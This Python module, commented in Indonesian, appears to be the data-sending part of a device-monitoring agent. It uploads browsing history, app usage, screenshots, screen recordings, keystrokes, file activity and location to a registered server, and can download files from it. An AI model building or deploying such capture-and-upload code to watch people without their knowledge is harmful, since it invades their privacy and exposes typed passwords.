import requests
import json
import uuid
import platform
import psutil
import subprocess
import os
from datetime import datetime

class DataSender:
    def __init__(self, server_url=None):
        self.config_path = "device_config.json"
        config = self._load_config()
        
        self.server_url = config.get("server_url")
        self.device_id = config.get("device_id")
        
        # Jika device_id belum ada di config, hasilkan dari hardware
        if not self.device_id:
            self.device_id = self._generate_hardware_id()
        
        # Jika ada server_url yang dioper saat init, gunakan itu (biasanya untuk testing)
        if server_url:
            self.server_url = server_url

    def _generate_hardware_id(self):
        """Menghasilkan ID unik yang konsisten untuk komputer yang sama (Hardware ID)"""
        try:
            # Menggabungkan MAC address, hostname, dan platform
            node = uuid.getnode()
            hostname = platform.node()
            system = platform.system()
            
            # Kita buat string unik berdasarkan hardware
            unique_str = f"{node}-{hostname}-{system}"
            
            # Gunakan uuid5 dengan namespace DNS untuk menghasilkan UUID yang konsisten dari string tersebut
            return str(uuid.uuid5(uuid.NAMESPACE_DNS, unique_str))
        except Exception as e:
            # Fallback jika gagal (sangat jarang)
            return str(uuid.uuid4())

    def _load_config(self):
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, "r") as f:
                    return json.load(f)
        except Exception as e:
            print(f"Error loading config: {e}")
        return {}

    def is_registered(self):
        """Mengecek apakah device sudah terdaftar (punya device_id dan server_url)"""
        return bool(self.device_id and self.server_url)

    def register_device(self, server_url):
        """Mendaftarkan device ke server baru"""
        # Bersihkan URL (hapus trailing slash)
        base_url = server_url.strip().rstrip('/')
        
        # Tentukan register endpoint dan base monitoring endpoint
        if "/api/monitoring" in base_url:
            register_url = f"{base_url}/register"
            target_server_url = base_url
        else:
            register_url = f"{base_url}/api/monitoring/register"
            target_server_url = f"{base_url}/api/monitoring"

        # Gunakan device_id yang sudah ada (hardware ID) atau buat baru jika belum ada
        if not self.device_id:
            self.device_id = self._generate_hardware_id()
        
        device_id = self.device_id
        
        # Simpan sementara untuk fallback jika gagal
        old_server_url = self.server_url
        
        system_info = self._get_system_info()

        # SESUAIKAN DENGAN EKSPEKTASI SERVER (Key: device_info)
        payload = {
            "device_info": system_info,
            "timestamp": datetime.now().isoformat()
        }

        try:
            response = requests.post(register_url, json=payload, timeout=15)
            if response.status_code in [200, 201]:
                self.server_url = target_server_url
                # Simpan permanen ke config
                with open(self.config_path, "w") as f:
                    json.dump({
                        "device_id": self.device_id,
                        "server_url": self.server_url
                    }, f, indent=4)
                return {"success": True, "device_id": device_id}
            
            # Revert jika gagal
            self.server_url = old_server_url
            return {"success": False, "error": f"Server returned status {response.status_code}"}
        except Exception as e:
            # Revert jika error
            self.server_url = old_server_url
            return {"success": False, "error": str(e)}

    def _get_or_create_device_id(self):
        # Method ini sekarang digantikan oleh logika di init dan register_device
        return self.device_id

    def _get_system_info(self):
        # Mendapatkan info CPU, RAM, Disk
        cpu_usage = psutil.cpu_percent(interval=None)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Info Baterai
        battery_info = {}
        try:
            battery = psutil.sensors_battery()
            if battery:
                battery_info = {
                    "percent": battery.percent,
                    "power_plugged": battery.power_plugged,
                    "secsleft": battery.secsleft
                }
        except:
            pass

        # Detail Tambahan via WMIC (Manufacturer, Model)
        manufacturer = "Unknown"
        model = "Unknown"
        try:
            if platform.system() == "Windows":
                manufacturer = subprocess.check_output('wmic computersystem get manufacturer').decode().split('\n')[1].strip()
                model = subprocess.check_output('wmic computersystem get model').decode().split('\n')[1].strip()
        except:
            pass

        return {
            "device_id": self.device_id,
            "hostname": platform.node(),
            "manufacturer": manufacturer,
            "model": model,
            "os": f"{platform.system()} {platform.release()}",
            "os_version": platform.version(),
            "platform": platform.platform(),
            "processor": platform.processor(),
            "cpu_usage_percent": cpu_usage,
            "memory": {
                "total": memory.total,
                "available": memory.available,
                "percent": memory.percent
            },
            "disk": {
                "total": disk.total,
                "used": disk.used,
                "free": disk.free,
                "percent": disk.percent
            },
            "battery": battery_info,
            "python_version": platform.python_version(),
            "timestamp": datetime.now().isoformat()
        }

    def send_app_usage(self, app_data, location_data=None):
        payload = {
            "device_info": self._get_system_info(),
            "data_type": "app_usage",
            "app_usage": app_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/app-usage",
                json=payload,
                timeout=10
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_browsing_history(self, history_data, location_data=None):
        payload = {
            "device_info": self._get_system_info(),
            "data_type": "browsing_history",
            "browsing_history": history_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/browsing-history",
                json=payload,
                timeout=15
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_all_data(self, app_usage_data, browsing_history_data, location_data=None):
        results = {
            "app_usage": self.send_app_usage(app_usage_data, location_data),
            "browsing_history": self.send_browsing_history(browsing_history_data, location_data)
        }

        return results

    def verify_registration(self):
        """Memverifikasi apakah device_id masih terdaftar di server"""
        if not self.is_registered():
            return {"success": False, "error": "Not registered localy"}
            
        verify_url = f"{self.server_url}/verify-registration"
        payload = {
            "device_id": self.device_id,
            "device_info": self._get_system_info(),
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            # Gunakan timeout pendek untuk pengecekan berkala
            response = requests.post(verify_url, json=payload, timeout=10)
            if response.status_code == 200:
                return {"success": True}
            elif response.status_code == 404:
                return {"success": False, "error": "Device not found on server", "code": 404}
            else:
                return {"success": False, "error": f"Server error: {response.status_code}"}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused", "code": "offline"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def logout(self):
        """Menghapus konfigurasi lokal (logout)"""
        self.device_id = None
        self.server_url = None
        if os.path.exists(self.config_path):
            try:
                os.remove(self.config_path)
                return True
            except:
                pass
        return False

    def fetch_config(self):
        """Mengambil konfigurasi lengkap dari API"""
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}
            
        # Gunakan base URL tanpa /api/monitoring jika perlu, 
        # tapi di sini kita asumsikan server handle /config di monitoring path
        config_url = f"{self.server_url}/config"
        params = {"device_id": self.device_id}
        
        try:
            response = requests.get(config_url, params=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                # Ekstrak objek config dari respons: {"status": "success", "config": {...}}
                config_data = data.get("config", {})
                
                # Simpan ke config lokal untuk fallback
                current_config = self._load_config()
                current_config["last_config"] = config_data
                
                with open(self.config_path, "w") as f:
                    json.dump(current_config, f, indent=4)
                    
                return {"success": True, "config": config_data}
            return {"success": False, "error": f"Status {response.status_code}"}
        except Exception as e:
            # Fallback ke config terakhir jika gagal (offline)
            current_config = self._load_config()
            if "last_config" in current_config:
                return {"success": True, "config": current_config["last_config"], "is_fallback": True}
            return {"success": False, "error": str(e)}

    def fetch_interval(self):
        # Method ini sekarang bisa digantikan oleh fetch_config, 
        # tapi tetap dipertahankan untuk kompatibilitas jika perlu
        result = self.fetch_config()
        if result.get("success"):
            interval = result["config"].get("sync_interval", 300)
            return {"success": True, "interval": interval}
        return result

    def send_screenshot(self, screenshot_data, location_data=None):
        if not screenshot_data:
            return {"success": False, "error": "No screenshot data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "screenshot",
            "filename": screenshot_data.get("filename", "screenshot.png"),
            "timestamp": screenshot_data.get("timestamp", datetime.now().isoformat()),
            "image_base64": screenshot_data.get("image_base64", ""),
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/screenshot",
                json=payload,
                timeout=30
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_all_data_with_screenshot(self, app_usage_data, browsing_history_data, screenshot_data=None, location_data=None):
        results = {
            "app_usage": self.send_app_usage(app_usage_data, location_data),
            "browsing_history": self.send_browsing_history(browsing_history_data, location_data)
        }

        if screenshot_data:
            results["screenshot"] = self.send_screenshot(screenshot_data, location_data)

        return results

    def send_recording(self, recording_data, location_data=None):
        if not recording_data:
            return {"success": False, "error": "No recording data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "screen_recording",
            "filename": recording_data.get("filename", "recording.mp4"),
            "start_time": recording_data.get("start_time", ""),
            "end_time": recording_data.get("end_time", ""),
            "duration_seconds": recording_data.get("duration_seconds", 0),
            "frame_count": recording_data.get("frame_count", 0),
            "video_base64": recording_data.get("video_base64", ""),
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/recording",
                json=payload,
                timeout=60
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_upload_activity(self, upload_data, location_data=None):
        if not upload_data:
            return {"success": False, "error": "No upload data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "file_upload_activity",
            "upload_activities": upload_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/upload-activity",
                json=payload,
                timeout=10
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_idle_events(self, idle_data, location_data=None):
        if not idle_data:
            return {"success": False, "error": "No idle data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "idle_event",
            "idle_events": idle_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/idle-event",
                json=payload,
                timeout=10
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_keystrokes(self, keystrokes_data, location_data=None):
        if not keystrokes_data:
            return {"success": False, "error": "No keystrokes data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "keystrokes",
            "keystrokes": keystrokes_data,
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/keystrokes",
                json=payload,
                timeout=15
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_location(self, location_data):
        if not location_data:
            return {"success": False, "error": "No location data provided"}

        payload = {
            "device_info": self._get_system_info(),
            "data_type": "location",
            "location": location_data,
            "sent_at": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                self.server_url + "/location",
                json=payload,
                timeout=10
            )
            return {"success": True, "status_code": response.status_code}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused - server not available"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "Request timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def download_file(self, file_id, local_path):
        """Download file dari server ke path lokal"""
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}
            
        # Dapatkan base URL server (tanpa /api/monitoring)
        base_url = self.server_url.replace("/api/monitoring", "")
        download_url = f"{base_url}/api/monitoring/downloadFile/{file_id}"
        
        try:
            response = requests.get(download_url, timeout=60, stream=True)
            
            if response.status_code == 200:
                # Pastikan direktori tujuan ada
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                
                # Tulis file secara streaming
                with open(local_path, "wb") as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                return {"success": True, "path": local_path}
            else:
                return {"success": False, "error": f"Server returned status {response.status_code}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def send_download_logs(self, download_logs):
        """Send download activity logs to server"""
        if not download_logs:
            return {"success": True, "message": "No logs to send"}
            
        if not self.is_registered():
            return {"success": False, "error": "Not registered"}
            
        payload = {
            "device_info": self._get_system_info(),
            "download_activities": download_logs
        }
        
        try:
            response = requests.post(
                self.server_url + "/download-activity",
                json=payload,
                timeout=30
            )
            if response.status_code in [200, 201]:
                return {"success": True, "status_code": response.status_code}
            else:
                return {"success": False, "error": f"Server returned status {response.status_code}"}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "Connection refused"}
        except Exception as e:
            return {"success": False, "error": str(e)}
